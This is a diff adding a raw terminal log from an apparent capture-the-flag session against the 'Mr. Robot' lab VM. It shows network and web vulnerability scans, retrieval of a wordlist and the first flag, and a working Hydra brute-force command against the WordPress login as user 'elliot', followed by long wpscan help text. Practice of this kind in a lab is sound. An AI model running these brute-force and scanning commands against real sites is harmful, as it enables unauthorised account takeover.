@@ -1,0 +1,1907 @@
+ Currently scanning: 172.18.225.0/16   |   Screen View: Unique Hosts           
+                                                                               
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.0.6     52:54:00:fc:98:b3      1      60  Unknown vendor              
+ 192.168.124.1   52:54:00:fc:98:b3      1      60  Unknown vendor              
+ 172.17.0.1      52:54:00:fc:98:b3      1      60  Unknown vendor              
+
+root@kali:~# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.124.128  netmask 255.255.255.0  broadcast 192.168.124.255
+        inet6 fe80::5054:ff:fef2:497e  prefixlen 64  scopeid 0x20<link>
+        ether 52:54:00:f2:49:7e  txqueuelen 1000  (Ethernet)
+        RX packets 317  bytes 19015 (18.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 382484  bytes 16065787 (15.3 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 66
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 20  bytes 1116 (1.0 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 20  bytes 1116 (1.0 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@kali:~# vim fsociety.dic
+root@kali:~# vim fsocity.dic
+root@kali:~# uniscan -u http://192.168.124.187
+^C
+root@kali:~# uniscan -u http://192.168.124.187/ -qw
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 17-11-2019 14:52:59
+===================================================================================================
+| Domain: http://192.168.124.187/
+| Server: Apache
+| IP: 192.168.124.187
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://192.168.124.187/Image/
+| [+] CODE: 200 URL: http://192.168.124.187/admin/
+| [+] CODE: 200 URL: http://192.168.124.187/feed/
+| [+] CODE: 200 URL: http://192.168.124.187/image/
+| [+] CODE: 200 URL: http://192.168.124.187/login/
+| [+] CODE: 200 URL: http://192.168.124.187/rss/
+| [+] CODE: 200 URL: http://192.168.124.187/wp-login/
+| [+] CODE: 200 URL: http://192.168.124.187/wp-admin/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://192.168.124.187/admin/index.html
+| [+] CODE: 200 URL: http://192.168.124.187/admin/index.php
+| [+] CODE: 200 URL: http://192.168.124.187/favicon.ico
+| [+] CODE: 200 URL: http://192.168.124.187/index.html
+| [+] CODE: 200 URL: http://192.168.124.187/index.html%20
+| [+] CODE: 200 URL: http://192.168.124.187/index.php
+| [+] CODE: 200 URL: http://192.168.124.187/license.txt
+| [+] CODE: 200 URL: http://192.168.124.187/readme
+| [+] CODE: 200 URL: http://192.168.124.187/readme.html
+| [+] CODE: 200 URL: http://192.168.124.187/robots.txt
+| [+] CODE: 200 URL: http://192.168.124.187/search/htx/SQLQHit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/search/htx/sqlqhit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/search/sqlqhit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/search/SQLQHit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/sitemap.xml
+===================================================================================================
+===================================================================================================
+Scan end date: 17-11-2019 14:55:8
+
+
+
+HTML report saved in: report/192.168.124.187.html
+root@kali:~# ls
+Desktop    Downloads    Music     Public     Videos
+Documents  fsocity.dic  Pictures  Templates
+root@kali:~# uniscan -u http://192.168.124.187/ -qweds
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 17-11-2019 14:59:28
+===================================================================================================
+| Domain: http://192.168.124.187/
+| Server: Apache
+| IP: 192.168.124.187
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://192.168.124.187/Image/
+| [+] CODE: 200 URL: http://192.168.124.187/admin/
+| [+] CODE: 200 URL: http://192.168.124.187/feed/
+| [+] CODE: 200 URL: http://192.168.124.187/image/
+| [+] CODE: 200 URL: http://192.168.124.187/login/
+| [+] CODE: 200 URL: http://192.168.124.187/rss/
+| [+] CODE: 200 URL: http://192.168.124.187/wp-login/
+| [+] CODE: 200 URL: http://192.168.124.187/wp-admin/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://192.168.124.187/admin/index.html
+| [+] CODE: 200 URL: http://192.168.124.187/admin/index.php
+| [+] CODE: 200 URL: http://192.168.124.187/favicon.ico
+| [+] CODE: 200 URL: http://192.168.124.187/index.html
+| [+] CODE: 200 URL: http://192.168.124.187/index.html%20
+| [+] CODE: 200 URL: http://192.168.124.187/index.php
+| [+] CODE: 200 URL: http://192.168.124.187/license.txt
+| [+] CODE: 200 URL: http://192.168.124.187/readme
+| [+] CODE: 200 URL: http://192.168.124.187/readme.html
+| [+] CODE: 200 URL: http://192.168.124.187/robots.txt
+| [+] CODE: 200 URL: http://192.168.124.187/search/htx/sqlqhit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/search/htx/SQLQHit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/search/SQLQHit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/search/sqlqhit.asp
+| [+] CODE: 200 URL: http://192.168.124.187/sitemap.xml
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| [+] Crawling finished, 59 URL's found!
+|
+| PHPinfo() Disclosure:
+|
+| Web Backdoors:
+|
+| Source Code Disclosure:
+|
+| E-mails:
+| [+] E-mail Found: m@tidakada.com
+|
+| File Upload Forms:
+|
+| External hosts:
+| [+] External Host Found: http://php.net
+| [+] External Host Found: http://httpd.apache.org
+| [+] External Host Found: https://codex.wordpress.org
+| [+] External Host Found: http://browsehappy.com
+| [+] External Host Found: https://wordpress.org
+| [+] External Host Found: http://www.mysql.com
+| [+] External Host Found: http://gmpg.org
+| [+] External Host Found: https://planet.wordpress.org
+|
+| FCKeditor File Upload:
+|
+| Timthumb:
+|
+| Ignored Files: 
+| http://192.168.124.187/wp-includes/js/jquery/jquery.js?ver=1.11.3
+| http://192.168.124.187/wp-includes/css/dashicons.min.css?ver=4.3.21
+| http://192.168.124.187/wp-admin/css/ie.min.css?ver=4.3.21
+| http://192.168.124.187/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010
+| http://192.168.124.187/wp-includes/js/comment-reply.min.js?ver=4.3.21
+| http://192.168.124.187/wp-includes/css/buttons.min.css?ver=4.3.21
+| http://192.168.124.187/wp-admin/css/login.min.css?ver=4.3.21
+| http://192.168.124.187/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010
+| http://192.168.124.187/wp-content/themes/twentyfifteen/style.css?ver=4.3.21
+| http://192.168.124.187/wp-admin/css/install.min.css?ver=4.3.21
+| http://192.168.124.187/wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2
+| http://192.168.124.187/wp-admin/css/install.css?ver=20100228
+| http://192.168.124.187/wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js?ver=20141010
+| http://192.168.124.187/wp-includes/wlwmanifest.xml
+| http://192.168.124.187/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010
+| http://192.168.124.187/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330
+| http://192.168.124.187/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1
+===================================================================================================
+| Dynamic tests:
+| Plugin name: Learning New Directories v.1.2 Loaded.
+| Plugin name: FCKedior tests v.1.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Find Backup Files v.1.2 Loaded.
+| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.2 Loaded.
+| Plugin name: SQL-injection tests v.1.2 Loaded.
+| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+| Plugin name: Web Shell Finder v.1.3 Loaded.
+| [+] 1 New directories added
+|                                                                                                   
+|                                                                                                   
+| FCKeditor tests:
+|                                                                                                   
+|                                                                                                   
+| Timthumb < 1.33 vulnerability:
+|                                                                                                   
+|                                                                                                   
+| Backup Files:
+|                                                                                                   
+|                                                                                                   
+| Blind SQL Injection:
+|                                                                                                   
+|                                                                                                   
+| Local File Include:
+|                                                                                                   
+|                                                                                                   
+| PHP CGI Argument Injection:
+|                                                                                                   
+|                                                                                                   
+| Remote Command Execution:
+|                                                                                                   
+|                                                                                                   
+| Remote File Include:
+|                                                                                                   
+|                                                                                                   
+| SQL Injection:
+|                                                                                                   
+|                                                                                                   
+| Cross-Site Scripting (XSS):
+|                                                                                                   
+|                                                                                                   
+| Web Shell Finder:
+===================================================================================================
+| Static tests:
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.1 Loaded.
+|                                                                                                   
+|                                                                                                   
+| Local File Include:
+|                                                                                                   
+|                                                                                                   
+| Remote Command Execution:
+|                                                                                                   
+|                                                                                                   
+| Remote File Include:
+===================================================================================================
+Scan end date: 17-11-2019 15:6:25
+
+
+
+HTML report saved in: report/192.168.124.187.html
+root@kali:~# ls
+Desktop    Downloads    Music     Public     Videos
+Documents  fsocity.dic  Pictures  Templates
+root@kali:~# mkdir Mr.Robot
+root@kali:~# cd Mr.Robot
+root@kali:~/Mr.Robot# wget http://192.168.124.187/robots.txt
+--2019-11-17 15:08:31--  http://192.168.124.187/robots.txt
+Connecting to 192.168.124.187:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 41 [text/plain]
+Saving to: ‘robots.txt’
+
+robots.txt          100%[===================>]      41  --.-KB/s    in 0s      
+
+2019-11-17 15:08:31 (2.81 MB/s) - ‘robots.txt’ saved [41/41]
+
+root@kali:~/Mr.Robot# wget http://192.168.124.187/fsocity.dic
+--2019-11-17 15:08:42--  http://192.168.124.187/fsocity.dic
+Connecting to 192.168.124.187:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7245381 (6.9M) [text/x-c]
+Saving to: ‘fsocity.dic’
+
+fsocity.dic         100%[===================>]   6.91M  8.02MB/s    in 0.9s    
+
+2019-11-17 15:08:43 (8.02 MB/s) - ‘fsocity.dic’ saved [7245381/7245381]
+
+root@kali:~/Mr.Robot# ls
+fsocity.dic  robots.txt
+root@kali:~/Mr.Robot# robots.txt
+bash: robots.txt: command not found
+root@kali:~/Mr.Robot# cat robots.txt
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+root@kali:~/Mr.Robot# wget http://192.168.124.187/key-1-of-3.txt
+--2019-11-17 15:13:18--  http://192.168.124.187/key-1-of-3.txt
+Connecting to 192.168.124.187:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 33 [text/plain]
+Saving to: ‘key-1-of-3.txt’
+
+key-1-of-3.txt      100%[===================>]      33  --.-KB/s    in 0s      
+
+2019-11-17 15:13:18 (2.60 MB/s) - ‘key-1-of-3.txt’ saved [33/33]
+
+root@kali:~/Mr.Robot# ls
+fsocity.dic  key-1-of-3.txt  robots.txt
+root@kali:~/Mr.Robot# cat key-1-of-3.txt
+073403c8a58a1f80d943455fb30724b9
+root@kali:~/Mr.Robot# vim fsocity.dic
+root@kali:~/Mr.Robot# wget http://192.168.124.187/sitemap.xml
+--2019-11-17 15:28:31--  http://192.168.124.187/sitemap.xml
+Connecting to 192.168.124.187:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 0 [application/xml]
+Saving to: ‘sitemap.xml’
+
+sitemap.xml                   [ <=>                                 ]       0  --.-KB/s    in 0s      
+
+2019-11-17 15:28:31 (0.00 B/s) - ‘sitemap.xml’ saved [0/0]
+
+root@kali:~/Mr.Robot# ls
+fsocity.dic  key-1-of-3.txt  robots.txt  sitemap.xml
+root@kali:~/Mr.Robot# cat sitemap.xml
+root@kali:~/Mr.Robot# hydra
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]
+
+Options:
+  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
+  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
+  -C FILE   colon separated "login:pass" format, instead of -L/-P options
+  -M FILE   list of servers to attack, one entry per line, ':' to specify port
+  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
+  -U        service module usage details
+  -h        more command line options (COMPLETE HELP)
+  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
+  service   the service to crack (see below for supported protocols)
+  OPT       some service modules support additional input (-U for module help)
+
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+
+Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
+v3.0. The newest version is always available at https://github.com/vanhauser-thc/thc-hydra
+Don't use in military or secret service organizations, or for illegal purposes.
+
+Example:  hydra -l user -P passlist.txt ftp://192.168.0.1
+root@kali:~/Mr.Robot# hydra -l elliot -P fsocity.dic http://192.168.124.187
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 15:38:59
+[ERROR] There is no service "http", most likely you mean one of the many web modules, e.g. http-get or http-form-post. Read it up!
+root@kali:~/Mr.Robot# hydra -l elliot -P fsocity.dic 192.168.124.187 http-form-post
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 15:39:57
+[WARNING] You must supply the web page as an additional option or via -m, default path set to /
+[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
+root@kali:~/Mr.Robot# hydra -l elliot -P fsocity.dic 192.168.124.187 -m "/wp-login.php"  http-form-postHydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 15:41:27
+[ERROR] the variables argument needs at least the strings ^USER^, ^PASS^, ^USER64^ or ^PASS64^: (null)
+root@kali:~/Mr.Robot# hydra -l elliot -P fsocity.dic 192.168.124.187 -m "/wp-login.php:user=elliot&password=^PASS^"  http-form-post
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 15:43:35
+[ERROR] Wrong syntax, requires three arguments separated by a colon which may not be null: /wp-login.php
+root@kali:~/Mr.Robot# hydra -l elliot -P fsocity.dic 192.168.124.187 -m "/wp-login.php:log=elliot&pwd=^PASS^"  http-form-post
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 15:44:11
+[ERROR] Wrong syntax, requires three arguments separated by a colon which may not be null: /wp-login.php
+root@kali:~/Mr.Robot# hydra -l elliot -P fsocity.dic 192.168.124.187 -m "/wp-login.php:log=elliot&pwd=^PASS^:ERROR"  http-form-post
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-11-17 15:44:43
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:1/p:858235), ~53640 tries per task
+[DATA] attacking http-post-form://192.168.124.187:80/wp-login.php:log=elliot&pwd=^PASS^:ERROR
+[STATUS] 736.00 tries/min, 736 tries in 00:01h, 857499 to do in 19:26h, 16 active
+[STATUS] 738.00 tries/min, 2214 tries in 00:03h, 856021 to do in 19:20h, 16 active
+[STATUS] 741.43 tries/min, 5190 tries in 00:07h, 853045 to do in 19:11h, 16 active
+[STATUS] 739.87 tries/min, 11098 tries in 00:15h, 847137 to do in 19:05h, 16 active
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+root@kali:~/Mr.Robot# wc --help
+Usage: wc [OPTION]... [FILE]...
+  or:  wc [OPTION]... --files0-from=F
+Print newline, word, and byte counts for each FILE, and a total line if
+more than one FILE is specified.  A word is a non-zero-length sequence of
+characters delimited by white space.
+
+With no FILE, or when FILE is -, read standard input.
+
+The options below may be used to select which counts are printed, always in
+the following order: newline, word, character, byte, maximum line length.
+  -c, --bytes            print the byte counts
+  -m, --chars            print the character counts
+  -l, --lines            print the newline counts
+      --files0-from=F    read input from the files specified by
+                           NUL-terminated names in file F;
+                           If F is - then read names from standard input
+  -L, --max-line-length  print the maximum display width
+  -w, --words            print the word counts
+      --help     display this help and exit
+      --version  output version information and exit
+
+GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
+Full documentation at: <https://www.gnu.org/software/coreutils/wc>
+or available locally via: info '(coreutils) wc invocation'
+root@kali:~/Mr.Robot# wpscan --help
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.3
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+Usage: wpscan [options]
+        --url URL                                 The URL of the blog to scan
+                                                  Allowed Protocols: http, https
+                                                  Default Protocol if none provided: http
+                                                  This option is mandatory unless update or help or hh or version is/are supplied
+    -h, --help                                    Display the simple help and exit
+        --hh                                      Display the full help and exit
+        --version                                 Display the version and exit
+    -v, --verbose                                 Verbose mode
+        --[no-]banner                             Whether or not to display the banner
+                                                  Default: true
+    -o, --output FILE                             Output to FILE
+    -f, --format FORMAT                           Output results in the format supplied
+                                                  Available choices: cli-no-colour, cli-no-color, cli, json
+        --detection-mode MODE                     Default: mixed
+                                                  Available choices: mixed, passive, aggressive
+        --user-agent, --ua VALUE
+        --random-user-agent, --rua                Use a random user-agent for each scan
+        --http-auth login:password
+    -t, --max-threads VALUE                       The max threads to use
+                                                  Default: 5
+        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1.
+        --request-timeout SECONDS                 The request timeout in seconds
+                                                  Default: 60
+        --connect-timeout SECONDS                 The connection timeout in seconds
+                                                  Default: 30
+        --disable-tls-checks                      Disables SSL/TLS certificate verification
+        --proxy protocol://IP:port                Supported protocols depend on the cURL installed
+        --proxy-auth login:password
+        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
+        --cookie-jar FILE-PATH                    File to read and write cookies
+                                                  Default: /tmp/wpscan/cookie_jar.txt
+        --force                                   Do not check if the target is running WordPress
+        --[no-]update                             Whether or not to update the Database
+        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content"
+        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins"
+    -e, --enumerate [OPTS]                        Enumeration Process
+                                                  Available Choices:
+                                                   vp   Vulnerable plugins
+                                                   ap   All plugins
+                                                   p    Plugins
+                                                   vt   Vulnerable themes
+                                                   at   All themes
+                                                   t    Themes
+                                                   tt   Timthumbs
+                                                   cb   Config backups
+                                                   dbe  Db exports
+                                                   u    User IDs range. e.g: u1-5
+                                                        Range separator to use: '-'
+                                                        Value if no argument supplied: 1-10
+                                                   m    Media IDs range. e.g m1-15
+                                                        Note: Permalink setting must be set to "Plain" for those to be detected
+                                                        Range separator to use: '-'
+                                                        Value if no argument supplied: 1-100
+                                                  Separator to use between the values: ','
+                                                  Default: All Plugins, Config Backups
+                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m
+                                                  Incompatible choices (only one of each group/s can be used):
+                                                   - vp, ap, p
+                                                   - vt, at, t
+        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration.
+                                                  Both the headers and body are checked. Regexp delimiters are not required.
+        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins, instead of the global (--detection-mode) mode.
+                                                  Default: passive
+                                                  Available choices: mixed, passive, aggressive
+        --plugins-version-detection MODE          Use the supplied mode to check plugins versions instead of the --detection-mode or --plugins-detection modes.
+                                                  Default: mixed
+                                                  Available choices: mixed, passive, aggressive
+    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.
+                                                  If no --username/s option supplied, user enumeration will be run.
+    -U, --usernames LIST                          List of usernames to use during the password attack.
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --multicall-max-passwords MAX_PWD         Maximum number of passwords to send by request with XMLRPC multicall
+                                                  Default: 500
+        --password-attack ATTACK                  Force the supplied attack to be used rather than automatically determining one.
+                                                  Available choices: wp-login, xmlrpc, xmlrpc-multicall
+        --stealthy                                Alias for --random-user-agent --detection-mode passive --plugins-version-detection passive
+
+[!] To see full list of options use --hh.
+root@kali:~/Mr.Robot# wpscan --hh
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 3.5.3
+          Sponsored by Sucuri - https://sucuri.net
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+Usage: wpscan [options]
+        --url URL                                 The URL of the blog to scan
+                                                  Allowed Protocols: http, https
+                                                  Default Protocol if none provided: http
+                                                  This option is mandatory unless update or help or hh or version is/are supplied
+    -h, --help                                    Display the simple help and exit
+        --hh                                      Display the full help and exit
+        --version                                 Display the version and exit
+        --ignore-main-redirect                    Ignore the main redirect (if any) and scan the target url
+    -v, --verbose                                 Verbose mode
+        --[no-]banner                             Whether or not to display the banner
+                                                  Default: true
+        --max-scan-duration SECONDS               Abort the scan if it exceeds the time provided in seconds
+    -o, --output FILE                             Output to FILE
+    -f, --format FORMAT                           Output results in the format supplied
+                                                  Available choices: cli-no-colour, cli-no-color, cli, json
+        --detection-mode MODE                     Default: mixed
+                                                  Available choices: mixed, passive, aggressive
+        --scope DOMAINS                           Comma separated (sub-)domains to consider in scope. 
+                                                  Wildcard(s) allowed in the trd of valid domains, e.g: *.target.tld
+                                                  Separator to use between the values: ','
+        --user-agent, --ua VALUE
+        --headers HEADERS                         Additional headers to append in requests
+                                                  Separator to use between the headers: '; '
+                                                  Examples: 'X-Forwarded-For: 127.0.0.1', 'X-Forwarded-For: 127.0.0.1; Another: aaa'
+        --vhost VALUE                             The virtual host (Host header) to use in requests
+        --random-user-agent, --rua                Use a random user-agent for each scan
+        --user-agents-list FILE-PATH              List of agents to use with --random-user-agent
+                                                  Default: /usr/share/rubygems-integration/all/gems/cms_scanner-0.5.0/app/user_agents.txt
+        --http-auth login:password
+    -t, --max-threads VALUE                       The max threads to use
+                                                  Default: 5
+        --throttle MilliSeconds                   Milliseconds to wait before doing another web request. If used, the max threads will be set to 1.
+        --request-timeout SECONDS                 The request timeout in seconds
+                                                  Default: 60
+        --connect-timeout SECONDS                 The connection timeout in seconds
+                                                  Default: 30
+        --disable-tls-checks                      Disables SSL/TLS certificate verification
+        --proxy protocol://IP:port                Supported protocols depend on the cURL installed
+        --proxy-auth login:password
+        --cookie-string COOKIE                    Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
+        --cookie-jar FILE-PATH                    File to read and write cookies
+                                                  Default: /tmp/wpscan/cookie_jar.txt
+        --cache-ttl TIME_TO_LIVE                  The cache time to live in seconds
+                                                  Default: 600
+        --clear-cache                             Clear the cache before the scan
+        --cache-dir PATH                          Default: /tmp/wpscan/cache
+        --server SERVER                           Force the supplied server module to be loaded
+                                                  Available choices: apache, iis, nginx
+        --force                                   Do not check if the target is running WordPress
+        --[no-]update                             Whether or not to update the Database
+        --wp-content-dir DIR                      The wp-content directory if custom or not detected, such as "wp-content"
+        --wp-plugins-dir DIR                      The plugins directory if custom or not detected, such as "wp-content/plugins"
+        --interesting-findings-detection MODE     Use the supplied mode for the interesting findings detection. 
+                                                  Available choices: mixed, passive, aggressive
+        --wp-version-all                          Check all the version locations
+        --wp-version-detection MODE               Use the supplied mode for the WordPress version detection, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --main-theme-detection MODE               Use the supplied mode for the Main theme detection, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+    -e, --enumerate [OPTS]                        Enumeration Process
+                                                  Available Choices:
+                                                   vp   Vulnerable plugins
+                                                   ap   All plugins
+                                                   p    Plugins
+                                                   vt   Vulnerable themes
+                                                   at   All themes
+                                                   t    Themes
+                                                   tt   Timthumbs
+                                                   cb   Config backups
+                                                   dbe  Db exports
+                                                   u    User IDs range. e.g: u1-5
+                                                        Range separator to use: '-'
+                                                        Value if no argument supplied: 1-10
+                                                   m    Media IDs range. e.g m1-15
+                                                        Note: Permalink setting must be set to "Plain" for those to be detected
+                                                        Range separator to use: '-'
+                                                        Value if no argument supplied: 1-100
+                                                  Separator to use between the values: ','
+                                                  Default: All Plugins, Config Backups
+                                                  Value if no argument supplied: vp,vt,tt,cb,dbe,u,m
+                                                  Incompatible choices (only one of each group/s can be used):
+                                                   - vp, ap, p
+                                                   - vt, at, t
+        --exclude-content-based REGEXP_OR_STRING  Exclude all responses matching the Regexp (case insensitive) during parts of the enumeration.
+                                                  Both the headers and body are checked. Regexp delimiters are not required.
+        --plugins-list LIST                       List of plugins to enumerate
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --plugins-detection MODE                  Use the supplied mode to enumerate Plugins, instead of the global (--detection-mode) mode.
+                                                  Default: passive
+                                                  Available choices: mixed, passive, aggressive
+        --plugins-version-all                     Check all the plugins version locations according to the choosen mode (--detection-mode, --plugins-detection and --plugins-version-detection)
+        --plugins-version-detection MODE          Use the supplied mode to check plugins versions instead of the --detection-mode or --plugins-detection modes.
+                                                  Default: mixed
+                                                  Available choices: mixed, passive, aggressive
+        --themes-list LIST                        List of themes to enumerate
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --themes-detection MODE                   Use the supplied mode to enumerate Themes, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --themes-version-all                      Check all the themes version locations according to the choosen mode (--detection-mode, --themes-detection and --themes-version-detection)
+        --themes-version-detection MODE           Use the supplied mode to check themes versions instead of the --detection-mode or --themes-detection modes.
+                                                  Available choices: mixed, passive, aggressive
+        --timthumbs-list FILE-PATH                List of timthumbs' location to use
+                                                  Default: /root/.wpscan/db/timthumbs-v3.txt
+        --timthumbs-detection MODE                Use the supplied mode to enumerate Timthumbs, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --config-backups-list FILE-PATH           List of config backups' filenames to use
+                                                  Default: /root/.wpscan/db/config_backups.txt
+        --config-backups-detection MODE           Use the supplied mode to enumerate Config Backups, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --db-exports-list FILE-PATH               List of DB exports' paths to use
+                                                  Default: /root/.wpscan/db/db_exports.txt
+        --db-exports-detection MODE               Use the supplied mode to enumerate DB Exports, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --medias-detection MODE                   Use the supplied mode to enumerate Medias, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+        --users-list LIST                         List of users to check during the users enumeration from the Login Error Messages
+                                                  Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+        --users-detection MODE                    Use the supplied mode to enumerate Users, instead of the global (--detection-mode) mode.
+                                                  Available choices: mixed, passive, aggressive
+    -P, --passwords FILE-PATH                     List of passwords to use during the password attack.
